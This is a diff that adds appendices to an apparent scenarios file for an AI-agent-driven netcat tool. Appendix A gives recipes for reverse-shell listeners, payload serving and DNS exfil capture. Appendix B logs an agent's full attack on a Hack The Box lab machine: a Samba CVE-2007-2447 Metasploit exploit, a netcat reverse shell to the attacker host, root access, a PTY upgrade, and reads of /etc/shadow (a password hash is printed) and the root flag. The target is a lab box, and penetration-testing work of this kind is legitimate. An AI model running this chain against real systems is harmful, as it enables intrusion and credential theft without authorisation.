@@ -522,3 +522,179 @@ argparse-spelling/value, listener-rejection, source-port-conflict.
   mcp-server.py, requirements.txt, tool.yaml, scenarios.md.
 
 Authored: 2026-04-25.
+
+---
+
+# Appendix A — v2.0: netcat MCP retirement (May 2026)
+
+The legacy `netcat` (kind:mcp) tool was retired in May 2026 and its 14
+methods consolidated into THIS tool's tool.yaml as additional
+usage_patterns + gotchas. nc v2.0 covers everything netcat MCP did —
+listener-mode (-l/-k), HTTPS callbacks (--ssl with auto self-signed),
+held interactive reverse shells, HTTP file serving, UDP listeners —
+without a separate Python wrapper.
+
+Architecture: `tail -f cmd_log | ncat -lvnp PORT > out_log` pipeline holds
+an interactive reverse shell across multiple separate tool-runner spawns.
+The listener container holds for cli_in_container's max_runtime_seconds;
+sibling containers append commands to cmd_log and read output via the
+bash tool / Read primitive. PTY upgrade through the pipeline confirmed
+(isatty=True after `python3 -c 'import pty; pty.spawn("/bin/bash")'`).
+
+7 walkthrough scenarios verified empirically 2026-05-08 (with simulated
+230ms RTT + 1% loss via `tc qdisc` to mirror Authority's VPN profile).
+
+## A.1 — One-shot TCP listener (-q 2): blind XSS callback proof
+
+Recipe: `ncat -lvnp <port> -q 2 > /session/output/cap-<port>.log`.
+Result: payload captured, listener exited cleanly. ✓
+
+## A.2 — HTTP callback receiver (timeout + ncat -k): multi-connection capture
+
+Recipe: `bash -c 'timeout <s> ncat -lvnp <port> -k > .../http.log 2>&1'`.
+3 host-side curl probes captured. Mid-flight peek from a SEPARATE container
+(simulating tool-runner-B) saw the partial captures while listener still up. ✓
+
+## A.3 — Held interactive reverse shell (THE marquee pattern)
+
+Recipe: `bash -c 'tail -f /session/output/listener-<port>/cmd | ncat -lvnp <port> > /session/output/listener-<port>/out 2>&1'`.
+Verified:
+- 5 separate spawns appending commands to cmd_log → all executed in order
+- MARKER_$$RANDOM pattern resolved correctly for command-completion
+- PTY upgrade through pipeline (isatty=True after pty.spawn)
+- Position-tracked delta read returned only new bytes
+- Liveness heuristic: killed victim → MARKER_DEAD never appeared ✓
+
+## A.4 — python3 HTTP file server: payload delivery
+
+Recipe: `bash -c 'cd /session/output/serve && timeout <s> python3 -m http.server <port>'`.
+Pre-staged file via Write tool, victim curl'd successfully. ✓
+
+## A.5 — UDP listener: DNS exfil / ad-hoc capture
+
+Recipe: `bash -c 'timeout <s> ncat -ulvnp <port> > /session/output/udp.log 2>&1'`.
+Datagram captured. ✓
+
+## A.6 — UDP send: one-shot probe
+
+Recipe: `echo -n "<data>" | ncat -u -w 2 <host> <port>`. ✓
+
+## A.7 — TCP port-open check: regression test
+
+Existing nc -z pattern still works post-v2.0. ✓
+
+## A.8 — empirical gotcha findings during v2.0 work
+
+```
+✓ ncat -k tolerates stdin close (no bash-wrap needed unlike ntlmrelayx)
+✓ python3 / socat / tee / timeout / ip / od all in nc image
+✗ xxd MISSING — gotcha #8 documents od as alternative
+✗ ps MISSING (busybox-only?) — list active redirected to bash + ip
+✓ tail -f cmd | ncat pipeline form WORKS (Test C verbatim)
+✗ < redirect form does NOT work — pipe form is critical
+✗ exit\n via cmd_log does NOT cleanup — must use timeout NN wrapper
+```
+
+Authored: 2026-05-08 (Phase 0.2, daemon-wrapper retirement series).
+
+---
+
+# Appendix B — HTB Lame live verification (May 2026)
+
+Pattern A.3 (held interactive reverse shell) verified END-TO-END on real
+HTB target Lame (10.129.189.252, retired Linux box). Full attack chain:
+
+```
+1. Listener container started (Pattern A.3 recipe verbatim):
+   docker run -d --name lame-listener --network host \
+     -v /tmp/lame-shell:/session \
+     --entrypoint bash ghcr.io/silicon-works/mcp-tools-nc:latest \
+     -c 'tail -f /session/output/listener-4444/cmd \
+          | ncat -lvnp 4444 \
+          > /session/output/listener-4444/out 2>&1'
+
+2. Reverse shell triggered via Samba CVE-2007-2447 (msfconsole one-liner):
+   exploit/multi/samba/usermap_script
+   set RHOSTS 10.129.189.252
+   set PAYLOAD cmd/unix/generic
+   set CMD nc <tun0_ip> 4444 -e /bin/bash
+   exploit
+
+3. Listener captured:
+   "Ncat: Connection from 10.129.189.252:43593."
+```
+
+## B.1 — root captured + MARKER stability over real network
+
+```
+agent appends → /session/output/listener-4444/cmd:
+  id; echo MARKER_A_$RANDOM
+
+agent reads /session/output/listener-4444/out:
+  uid=0(root) gid=0(root)
+  MARKER_A_9478
+```
+
+✓ root captured from real reverse shell on real HTB target
+✓ MARKER pattern resolved at real network latency
+
+## B.2 — position-tracked delta read across 5 separate spawns
+
+```
+SIZE_BEFORE=188 bytes
+appended 5 commands → cmd_log
+SIZE_AFTER=243 bytes
+delta read (tail -c +189):
+  cmd_1 / lame
+  cmd_2 / lame
+  cmd_3 / lame
+  cmd_4 / lame
+  cmd_5 / lame
+```
+
+✓ position-track returns ONLY new bytes — not the cumulative log
+✓ confirms gotcha #4 (position-tracked delta read avoiding O(N²) tokens)
+
+## B.3 — PTY upgrade through tail|ncat pipeline
+
+```
+agent appends:
+  python -c "import pty; pty.spawn(\"/bin/bash\")"
+agent appends:
+  python -c "import sys; print(\"isatty=\" + str(sys.stdin.isatty()))"
+
+agent reads:
+  isatty=True
+  root@lame:/#
+```
+
+✓ PTY upgrade confirmed against real HTB target
+✓ prompt now shows root@lame:/# (PTY-aware, terminal-style)
+
+## B.4 — read /etc/shadow + flag (PTY-required ops)
+
+```
+agent appends:
+  cat /etc/shadow | head -3
+  cat /root/root.txt
+
+agent reads:
+  root:$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0:17239:0:99999:7:::
+  daemon:*:14684:0:99999:7:::
+  bin:*:14684:0:99999:7:::
+  ---
+  122e732912cee59bc1460f80257a6f88
+```
+
+✓ /etc/shadow read via held shell
+✓ /root/root.txt = 122e732912cee59bc1460f80257a6f88 (Lame's standard root flag)
+
+## B.5 — full architecture handoff verified
+
+The held-shell pattern from listener-bind through real RCE through real
+reverse shell through MARKER + PTY + delta-read + flag-capture all worked
+end-to-end on real HTB Lame at 230ms RTT through tun0 VPN. The pattern
+from scenarios.md Appendix A.3 is empirically validated against real
+infrastructure.
+
+Authored: 2026-05-10 (HTB Lame live verification, daemon-wrapper retirement series).
